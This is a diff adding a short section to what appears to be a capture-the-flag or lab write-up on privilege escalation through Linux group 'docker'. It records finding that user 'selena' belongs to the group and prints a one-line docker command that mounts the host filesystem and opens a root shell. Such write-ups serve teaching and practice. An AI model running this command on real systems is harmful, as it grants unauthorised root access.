@@ -149,7 +149,15 @@
 
 ### Privesc with group `docker`
 
+- I ran command `id` and discovered that user `selena` is part of group `docker`.
+
+![image](https://github.com/user-attachments/assets/8db07196-c4f9-4fe7-b4fb-d809b6609fc4)
+
+- I used the payload to spawn a root shell with docker.
+  Payload-:```docker run -v /:/mnt --rm -it alpine chroot /mnt bash```
+
 -
+
 
 
 
